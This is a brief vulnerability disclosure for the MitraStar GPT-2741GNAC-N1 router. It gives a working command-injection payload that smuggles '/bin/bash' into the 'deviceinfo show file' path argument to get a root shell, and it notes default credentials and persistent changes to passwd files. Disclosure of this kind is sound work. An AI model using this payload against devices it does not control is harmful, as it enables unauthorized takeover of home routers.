## Privilege escalation MitraStar Router GPT-2741GNAC-N1

### Vulnerability on MitraStar routers

**Device:** MitrastarGPT-2741GNAC-N1

**Firmware:** BR_g5.9_1.11(WVK.0)b32 (not tested in other version)

### Exploit

**Mitrastar GPT-2741GNAC-N1** devices are provided with access through ssh into a restricted default shell:

```sh
C:\Users\<username>\ssh support@192.168.15.1
support@192.168.15.1's password:
```

The restricted shell has CLI Version **Reduced_CLI_HGU_v14**, and the environment is restricted to avoid execution of common linux/unix commands.

```sh
>show device_model
device_model GPT-2741GNAC
>show cli_version
cli_version Reduced_CLI_HGU_v14
```

The command **deviceinfo show file** is supposed to be used from reduced CLI to show files and directories. Because this command do not handle correctly special characters, is possible to insert a second command as a parameter in the "path" value. Using **"\n /bin/bash"** as a parameter value, we can generate a console with root access, as seen below:

```
> deviceinfo show file "\n /bin/bash"
app             bosa            data            etc             lib             mini_httpdroot  sbin            tmp             usr
bin             bosabackup      dev             fwbuffer        linuxrc         proc            sys             userfs          var
```

So it is possible to escalate privileges by spawning a full interoperable console with root privileges

Through this escalation we can change the content of **/etc/passwd** or **(/var/passwd)**, create new users, or change any other system resource permanently.

The user **support** is provided printed on the back of the router. In some cases, this routers use default credentials.
